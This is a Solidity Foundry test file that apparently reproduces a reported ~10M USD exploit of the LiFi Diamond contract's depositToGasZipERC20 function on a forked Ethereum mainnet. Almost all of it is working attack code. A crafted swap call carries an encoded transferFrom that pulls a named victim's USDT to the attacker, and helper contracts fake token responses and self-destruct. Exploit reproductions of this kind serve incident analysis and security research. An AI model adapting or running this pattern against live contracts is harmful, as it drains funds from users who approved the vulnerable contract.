// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~10M USD
// TX : https://app.blocksec.com/explorer/tx/eth/0xd82fe84e63b1aa52e1ce540582ee0895ba4a71ec5e7a632a3faa1aff3e763873
// Attacker : https://etherscan.io/address/0x8b3cb6bf982798fba233bca56749e22eec42dcf3
// Attack Contract : https://etherscan.io/address/0x986aca5f2ca6b120f4361c519d7a49c5ac50c240
// GUY : https://x.com/danielvf/status/1505689981385334784

library LibSwap {
    struct SwapData {
        address callTo;
        address approveTo;
        address sendingAssetId;
        address receivingAssetId;
        uint256 fromAmount;
        bytes callData;
        bool requiresDeposit;
    }
}
interface  LiFiDiamond{
    
   function depositToGasZipERC20(
        LibSwap.SwapData calldata _swapData,
        uint256 _destinationChains,
        address _recipient
    ) external ;

}
contract ContractTest is Test {
    IAaveFlashloan aave = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    LiFiDiamond Vulncontract=LiFiDiamond(0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address Victim=0xABE45eA636df7Ac90Fb7D8d8C74a081b169F92eF;
    Money money;
    function setUp() public {
        vm.createSelectFork("mainnet", 20318962);
    }

    function testExpolit() public {
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), USDT.decimals());
        attack();
        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), USDT.decimals());


    }

    function attack() public {
        money=new Money();
        LibSwap.SwapData memory swapData = LibSwap.SwapData({
            callTo: address(USDT),
            approveTo: address(this),
            sendingAssetId: address(money),
            receivingAssetId: address(money),
            fromAmount: 1,
            callData: abi.encodeWithSelector(bytes4(0x23b872dd), address(Victim),address(this),2276295880553),
            requiresDeposit: true
        });

        Vulncontract.depositToGasZipERC20(swapData, 0, address(this));

    }
    fallback()payable external{}
}

contract Money  is Test{
    IAaveFlashloan aave = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 Stone = IERC20(0x7122985656e38BDC0302Db86685bb972b145bD3C);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    LiFiDiamond Vulncontract=LiFiDiamond(0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address Victim=0xABE45eA636df7Ac90Fb7D8d8C74a081b169F92eF;
    address other=0xF929bA2AEec16cFfcfc66858A9434E194BAaf80D;
    address owner;
    Help help;
    constructor() payable{
        owner = msg.sender;
    }
    function balanceOf(address who) external view returns (uint256){
        return 1;
    }
    function allowance(address _owner, address spender) external view returns (uint256){
        return 0;
    }

   function approve(address spender, uint256 amount) external returns (bool) {
        help=new Help();
        help.sendto{value: 1}(address(Vulncontract));
        return true;
    }
 fallback() external payable {

    }
}

contract Help  is Test{
    IAaveFlashloan aave = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 Stone = IERC20(0x7122985656e38BDC0302Db86685bb972b145bD3C);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    LiFiDiamond Vulncontract=LiFiDiamond(0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address Victim=0xABE45eA636df7Ac90Fb7D8d8C74a081b169F92eF;
    address owner;
    constructor() payable{
        owner = msg.sender;
    }
    function sendto(address who) payable external {
        (bool success, bytes memory retData)=address(Vulncontract).call{value: msg.value}("");
        require(success, "Error");
        selfdestruct(payable(msg.sender));
    }
    fallback() external payable {}
}